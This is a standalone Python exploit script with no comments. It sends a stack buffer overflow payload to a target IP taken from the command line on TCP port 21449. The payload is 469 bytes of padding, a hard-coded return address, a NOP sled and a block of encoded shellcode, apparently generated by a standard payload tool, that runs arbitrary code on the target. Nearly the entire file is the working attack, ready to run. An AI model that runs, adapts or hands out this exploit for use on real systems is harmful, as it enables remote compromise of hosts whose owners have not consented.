#!/usr/bin/python3

import sys
import socket
from struct import pack

def send_payload(ipaddr):
    port = 21449
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        soc.connect((ipaddr,port))
        soc.send(build_payload())
        print("Payload Sent")
    except:
        print('Could not establish connection to host | lost connection to host')
    soc.close()

def build_payload():
    offset = 469
    junk_buffer = b'A'*offset
    eip = pack('<L', 0x621014E3)
    nop = b"\x90"*32
    buf=b""
    buf+=b"\xda\xc1\xba\x8c\x9e\xbd\xcf\xd9\x74\x24\xf4\x5e"
    buf+=b"\x29\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xda"
    buf+=b"\x8d\x5f\x3a\x1e\x59\x1d\xc5\xde\x9a\x42\x4f\x3b"
    buf+=b"\xab\x42\x2b\x48\x9c\x72\x3f\x1c\x11\xf8\x6d\xb4"
    buf+=b"\xa2\x8c\xb9\xbb\x03\x3a\x9c\xf2\x94\x17\xdc\x95"
    buf+=b"\x16\x6a\x31\x75\x26\xa5\x44\x74\x6f\xd8\xa5\x24"
    buf+=b"\x38\x96\x18\xd8\x4d\xe2\xa0\x53\x1d\xe2\xa0\x80"
    buf+=b"\xd6\x05\x80\x17\x6c\x5c\x02\x96\xa1\xd4\x0b\x80"
    buf+=b"\xa6\xd1\xc2\x3b\x1c\xad\xd4\xed\x6c\x4e\x7a\xd0"
    buf+=b"\x40\xbd\x82\x15\x66\x5e\xf1\x6f\x94\xe3\x02\xb4"
    buf+=b"\xe6\x3f\x86\x2e\x40\xcb\x30\x8a\x70\x18\xa6\x59"
    buf+=b"\x7e\xd5\xac\x05\x63\xe8\x61\x3e\x9f\x61\x84\x90"
    buf+=b"\x29\x31\xa3\x34\x71\xe1\xca\x6d\xdf\x44\xf2\x6d"
    buf+=b"\x80\x39\x56\xe6\x2d\x2d\xeb\xa5\x39\x82\xc6\x55"
    buf+=b"\xba\x8c\x51\x26\x88\x13\xca\xa0\xa0\xdc\xd4\x37"
    buf+=b"\xc6\xf6\xa1\xa7\x39\xf9\xd1\xee\xfd\xad\x81\x98"
    buf+=b"\xd4\xcd\x49\x58\xd8\x1b\xdd\x08\x76\xf4\x9e\xf8"
    buf+=b"\x36\xa4\x76\x12\xb9\x9b\x67\x1d\x13\xb4\x02\xe4"
    buf+=b"\xf4\xb1\xd8\xe9\x0c\xae\xde\xf5\x17\x17\x56\x13"
    buf+=b"\x4d\x77\x3e\x8c\xfa\xee\x1b\x46\x9a\xef\xb1\x23"
    buf+=b"\x9c\x64\x36\xd4\x53\x8d\x33\xc6\x04\x7d\x0e\xb4"
    buf+=b"\x83\x82\xa4\xd0\x48\x10\x23\x20\x06\x09\xfc\x77"
    buf+=b"\x4f\xff\xf5\x1d\x7d\xa6\xaf\x03\x7c\x3e\x97\x87"
    buf+=b"\x5b\x83\x16\x06\x29\xbf\x3c\x18\xf7\x40\x79\x4c"
    buf+=b"\xa7\x16\xd7\x3a\x01\xc1\x99\x94\xdb\xbe\x73\x70"
    buf+=b"\x9d\x8c\x43\x06\xa2\xd8\x35\xe6\x13\xb5\x03\x19"
    buf+=b"\x9b\x51\x84\x62\xc1\xc1\x6b\xb9\x41\xf1\x21\xe3"
    buf+=b"\xe0\x9a\xef\x76\xb1\xc6\x0f\xad\xf6\xfe\x93\x47"
    buf+=b"\x87\x04\x8b\x22\x82\x41\x0b\xdf\xfe\xda\xfe\xdf"
    buf+=b"\xad\xdb\x2a"
    return junk_buffer + eip + nop + buf


send_payload(sys.argv[1])
